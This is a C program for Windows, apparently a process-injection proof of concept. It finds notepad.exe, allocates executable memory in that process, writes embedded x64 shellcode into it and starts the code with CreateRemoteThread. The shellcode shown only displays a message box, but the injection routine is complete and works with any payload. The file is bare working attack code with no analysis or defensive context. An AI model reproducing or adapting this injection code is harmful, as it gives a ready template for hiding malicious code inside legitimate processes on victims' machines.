#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main(int argc, char** argv) {
    // Define MessageBox shellcode (x64)
    unsigned char shellcode[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
        "\x8d\x8d\x3c\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
        "\x00\x3e\x4c\x8d\x85\x33\x01\x00\x00\x48\x31\xc9\x41\xba"
        "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
        "\x56\xff\xd5\x47\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f"
        "\x72\x6f\x6f\x74\x4c\x30\x72\x2f\x50\x72\x6f\x63\x65\x73"
        "\x73\x2d\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x00\x48\x65"
        "\x79\x20\x42\x61\x62\x65\x00\x75\x73\x65\x72\x33\x32\x2e"
        "\x64\x6c\x6c\x00";


    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(snapshot, &pe32);
    do {

        if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            // Allocate memory in `notepad.exe`
            LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

            if (allocated_mem == NULL) {

                printf("Memory allocation failed: %ul\n", GetLastError());

                return 1;
            }

            printf("Memory page allocated at: 0x%p\n", allocated_mem);
            // Write shellcode to the allocated memory in `notepad.exe`
            WriteProcessMemory(hProcess, allocated_mem, shellcode, sizeof(shellcode), NULL);
            // Create a thread to execute shellcode
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

            if (hThread == NULL) {

                printf("Falied to obtain handle to process: %ul\n", GetLastError());

                return 1;
            }
            WaitForSingleObject(hThread, INFINITE);
            VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
            CloseHandle(hThread);
            CloseHandle(hProcess);

            break;
        }
        // Enumerate the snapshot
    } while (Process32Next(snapshot, &pe32));

    return 0;
}